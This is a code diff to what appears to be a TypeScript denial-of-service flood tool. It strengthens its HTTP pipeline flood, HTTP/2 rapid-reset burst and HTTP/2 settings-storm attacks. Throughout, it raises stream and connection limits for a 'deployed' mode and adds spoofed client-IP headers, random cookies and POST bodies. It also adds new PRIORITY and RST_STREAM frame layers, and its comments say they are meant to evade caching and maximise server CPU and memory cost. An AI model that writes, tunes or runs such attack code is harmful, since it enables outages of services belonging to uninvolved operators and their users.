@@ -1349,8 +1349,10 @@ async function runHTTPPipeline(
 
   function buildRawReq(host: string): Buffer {
     const path = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
-    return Buffer.from([
-      `GET ${path} HTTP/1.1`,
+    const isPost = Math.random() < 0.35; // 35% POST — forces server-side read/parse
+    const body   = isPost ? `{"q":"${randStr(12)}","ts":${Date.now()}}` : "";
+    const lines  = [
+      `${isPost ? "POST" : "GET"} ${path} HTTP/1.1`,
       `Host: ${host}`,
       `User-Agent: ${randUA()}`,
       `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
@@ -1360,12 +1362,18 @@ async function runHTTPPipeline(
       `X-Real-IP: ${randIp()}`,
       `CF-Connecting-IP: ${randIp()}`,
       `X-Request-ID: ${randHex(16)}`,
-      `Cache-Control: no-cache, no-store`,
+      `Cache-Control: no-cache, no-store, must-revalidate`,
       `Pragma: no-cache`,
       `Referer: https://google.com/search?q=${randStr(8)}`,
+      `Cookie: session=${randHex(24)}; _ga=GA1.${randInt(1,9)}.${randInt(1e8,9e8)}.${Date.now()}`,
       `Connection: keep-alive`,
-      ``, ``,
-    ].join("\r\n"));
+    ];
+    if (isPost) {
+      lines.push(`Content-Type: application/json`);
+      lines.push(`Content-Length: ${body.length}`);
+    }
+    lines.push(``, body); // blank line + optional body
+    return Buffer.from(lines.join("\r\n"));
   }
 
   // Refresh pool continuously — keeps paths/IPs/tokens fresh (evade caching/dedup)
@@ -1479,8 +1487,8 @@ async function runHTTP2Flood(
         let pumpCount = 0;
         const pump = () => {
           if (signal.aborted || conn.destroyed) { resolve(); return; }
-          // Deployed: 128 streams per burst (was 64) — doubles H2 RST throughput
-          for (let burst = 0; burst < (IS_DEPLOYED ? 128 : 64) && !signal.aborted && !conn.destroyed; burst++) {
+          // Deployed: 256 streams per burst (was 128) — doubles H2 RST throughput vs before
+          for (let burst = 0; burst < (IS_DEPLOYED ? 256 : 32) && !signal.aborted && !conn.destroyed; burst++) {
             const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
             try {
               const stream = conn.request({
@@ -1515,7 +1523,8 @@ async function runHTTP2Flood(
           // simultaneously processing RST queue + generating ACK responses.
           pumpCount++;
           if (pumpCount % 4 === 0 && !conn.destroyed) {
-            for (let p = 0; p < 12; p++) {
+            // Deployed: 24 PINGs per 4 bursts — forces 24 mandatory PING ACKs from server
+            for (let p = 0; p < (IS_DEPLOYED ? 24 : 6); p++) {
               try {
                 const pingData = Buffer.allocUnsafe(8);
                 pingData.writeUInt32BE(randInt(0, 0x7fffffff), 0);
@@ -2464,8 +2473,13 @@ async function runH2RstBurst(
 ): Promise<void> {
   const { connect: h2connect } = await import("node:http2");
   const target   = `https://${resolvedIp}:${port}`;
-  const RST_PER_CONN = Math.min(threads * 8, 2000); // pairs per connection before reconnect
-  const INFLIGHT     = Math.min(threads * 4, 1000); // max concurrent in-flight streams
+  // Deployed: higher limits → more RST pairs before reconnect → server allocates/frees more state
+  const RST_PER_CONN = IS_DEPLOYED
+    ? Math.min(threads * 16, 8000)    // 8K RST pairs per conn (deployed — 32GB RAM)
+    : Math.min(threads * 8, 500);     // 500 RST pairs per conn (dev — conservative)
+  const INFLIGHT = IS_DEPLOYED
+    ? Math.min(threads * 8, 2000)     // 2K in-flight streams (deployed)
+    : Math.min(threads * 4, 200);     // 200 in-flight streams (dev)
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -2527,7 +2541,10 @@ async function runH2RstBurst(
     }
   };
 
-  const concurrency = Math.min(Math.max(2, Math.floor(threads / 50)), 24);
+  // Deployed: more concurrent connection slots → more parallel RST streams
+  const concurrency = IS_DEPLOYED
+    ? Math.min(Math.max(4, Math.floor(threads / 20)), 200)  // up to 200 slots deployed
+    : Math.min(Math.max(2, Math.floor(threads / 50)), 8);   // up to 8 slots dev
   await Promise.all(Array.from({ length: concurrency }, () => runSlot()));
   clearInterval(flushIv); flush();
 }
@@ -3234,6 +3251,21 @@ async function runH2SettingsStorm(
   const SETTINGS_CLEAR = mkSettingsHTS(0);     // clears HPACK dynamic table entirely
   const SETTINGS_FULL  = mkSettingsHTS(65536); // restores 64KB HPACK table
 
+  // RST_STREAM frame — forces server to immediately discard per-stream state
+  const mkRST = (streamId: number, errorCode = 0): Buffer => {
+    const p = Buffer.allocUnsafe(4);
+    p.writeUInt32BE(errorCode, 0); // 0=NO_ERROR — "nice" RST, still forces cleanup
+    return mkFrame(0x03, 0x00, streamId, p);
+  };
+
+  // PRIORITY frame — forces server to recompute H2 priority dependency tree
+  const mkPriority = (streamId: number, depStreamId: number, weight: number): Buffer => {
+    const p = Buffer.allocUnsafe(5);
+    p.writeUInt32BE(depStreamId & 0x7fffffff, 0); // exclusive=0 for simplicity
+    p[4] = weight & 0xff;                          // weight 0-255
+    return mkFrame(0x02, 0x00, streamId, p);
+  };
+
   // WINDOW_UPDATE frame: stream 0 (connection) or stream N
   const mkWU = (streamId: number, increment: number): Buffer => {
     const p = Buffer.allocUnsafe(4);
@@ -3286,6 +3318,7 @@ async function runH2SettingsStorm(
       // Storm loop — run as fast as the event loop allows
       // Frames are small (15B SETTINGS + 13B × OPEN_STREAMS WU) so no backpressure needed
       let toggle = false;
+      let stormCount = 0;
       const storm = () => {
         if (signal.aborted || sock.destroyed) { done(); return; }
 
@@ -3295,6 +3328,16 @@ async function runH2SettingsStorm(
         toggle = !toggle;
         sock.write(settings);
         localPkts++; localBytes += settings.length;
+
+        // Layer 2: PRIORITY frames — forces server to recompute H2 dependency tree
+        // Rotate weights and dependency IDs to maximize tree-rebalancing CPU cost
+        for (let sid = 1; sid < topStreamId; sid += 2) {
+          const depSid = (sid === 1) ? 3 : 1; // circular dependency (harmless for us)
+          const w = randInt(1, 255);
+          const pf = mkPriority(sid, depSid % topStreamId || 1, w);
+          sock.write(pf);
+          localPkts++; localBytes += pf.length;
+        }
 
         // Layer 3: WINDOW_UPDATE on every open stream + connection
         // Moderate increment (8192) to stay well below the 2^31-1 overflow boundary
@@ -3306,6 +3349,27 @@ async function runH2SettingsStorm(
         const cWU = mkWU(0, 8192);
         sock.write(cWU);
         localPkts++; localBytes += 13;
+
+        // Layer 4: RST_STREAM every 3 iterations (keeps server cleaning up state)
+        // After RST, we re-open the stream on next cycle → server must allocate again
+        if (stormCount % 3 === 2) {
+          for (let sid = 1; sid < topStreamId; sid += 2) {
+            const rst = mkRST(sid, 0); // NO_ERROR — server must clean up stream state
+            sock.write(rst);
+            localPkts++; localBytes += rst.length;
+          }
+          // Re-open streams after RST so they can be targeted again next iteration
+          for (let i = 0; i < OPEN_STREAMS; i++) {
+            const newSid = topStreamId + (i * 2);
+            const f = mkOpenHeaders(newSid);
+            sock.write(f);
+            localPkts++; localBytes += f.length;
+          }
+          topStreamId += OPEN_STREAMS * 2;
+          // Cap stream ID before H2 limit (2^31-1) — reset connection if exceeded
+          if (topStreamId > 0x40000000) { sock.destroy(); done(); return; }
+        }
+        stormCount++;
 
         setImmediate(storm);
       };
